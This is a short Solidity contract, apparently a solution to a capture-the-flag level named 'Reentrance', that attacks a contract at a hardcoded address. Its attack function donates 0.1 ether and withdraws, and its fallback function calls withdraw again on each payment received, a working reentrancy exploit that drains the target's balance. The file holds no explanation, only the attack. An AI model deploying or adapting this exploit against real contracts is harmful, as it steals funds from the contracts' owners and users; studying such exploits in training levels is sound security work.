pragma solidity ^0.4.18;

import './Reentrance.sol';

contract Enter {

  Reentrance r;

  constructor() public payable {
    r = Reentrance(0x3d10eaed780ccfec50a95597e65c761d380013b8);
  }

  function attack() public payable {
    r.donate.value(0.1 ether)(this);
    r.withdraw(0.1 ether);
  }

  function() public payable {
    r.withdraw(0.1 ether);
  }
}
